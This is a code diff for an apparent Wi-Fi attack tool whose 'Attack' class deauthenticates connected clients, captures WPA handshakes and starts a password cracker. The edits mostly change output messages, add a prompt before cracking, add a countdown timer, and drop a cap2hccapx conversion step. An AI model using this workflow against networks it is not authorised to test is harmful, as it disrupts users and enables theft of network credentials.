@@ -9,6 +9,7 @@ from glob import glob
 from check_handshake import checkHandshake
 import signal
 from cracker import Cracker
+import shutil
 
 class Attack(object):
 	"""docstring for Attack"""
@@ -62,7 +63,9 @@ class Attack(object):
 				print(colors.BOLD+colors.O + "[+]" + colors.W +colors.BOLD+" Captured handshake successfully!" + colors.W)
 				
 			else:
-				print(colors.O + "[-]" + colors.W + " Timeout")
+				print(colors.R + "[-]" + colors.W + " Timeout")
+				print()
+				print(colors.O + "[!]" + colors.W + " No devices are connected to the router!")
 		except KeyboardInterrupt:
 			pass
 
@@ -71,11 +74,10 @@ class Attack(object):
 	def deauth_clients(self):
 	
 		if(len(self.clients) != 0):
-			
+			print("")
+			client = colors.BOLD+colors.GR + str(self.clients).upper() + colors.W
+			print(colors.GR + colors.BOLD+ "[+]" + colors.W + f" Sending Deauth packet to: {self.clients}")
 			for i in self.clients:
-				client = colors.BOLD+colors.GR + str(i).upper() + colors.W
-				print(colors.O + "[+]" + colors.W + f" Sending Deauth packet to: {client}")
-				print("")
 				self.deauth(i)
 				time.sleep(0.2)
 	
@@ -122,33 +124,35 @@ class Attack(object):
 				
 
 
-	def convert_cap_hccap(self):
-		# hashcat is much faster for cracking
-		try:
-			file = glob("capture*.cap")[0]
-			cmd = f"cap2hccapx.bin {os.path.join(self.dir,file)} {self.targetRouterMac}_hs.hccapx"
-			print(colors.O + "[+]" + colors.W + " Coverting pcap to hccapx for cracking.")
-			subprocess.call(cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-			print(colors.O + "[+]" + colors.W + f" Saved to {self.targetRouterMac}_hs.hccapx")
-		except:
-			pass
-
 
 	def call_cracker(self):
-		print(colors.B + "[+]" + colors.W + " Trying to crack the passwords.")
-		time.sleep(1)
-		print(colors.O + "[-]" + colors.W + " Starting the cracker")
-		time.sleep(3)
-		x = Cracker()
-		x.crack()
-		# after cracking done ask user to save file 
-
 		print(colors.O + "[-]" + colors.W + " Saving your handshake ")
 		file = glob("capture*.cap")[0]
-		os.rename(file, f"{self.targetRouterMac}_hs.cap")
-		print(colors.O + "[+]" + colors.W + f" Handshake saved: {self.targetRouterMac}_hs.cap")
+		shutil.copyfile(file,f"{self.targetRouterMac}_hs.cap")
 
 
+		val = input(colors.O+"[?] " + colors.W +"Do you want to crack the passwords? (Y/N) ")
+		if val.lower() == 'y':
+			print(colors.B + "[+]" + colors.W + " Trying to crack the passwords.")
+			time.sleep(1)
+			print(colors.O + "[-]" + colors.W + " Starting the cracker")
+			time.sleep(3)
+			x = Cracker()
+			x.crack()
+
+		else:
+			self.ENGINE.exit()
+		
+
+	def countdown(self,t):
+		print('')
+		while t:
+			mins, secs = divmod(t, 60)
+			timer = '{:02d}:{:02d}'.format(mins, secs)
+			# print(colors.O + "[+]" +colors.W + " Searching for networks: ", end=' ')
+			print(colors.GR + timer, end="\r")
+			time.sleep(1)
+			t -= 1
 
 
 class RepeatTimer(Timer):
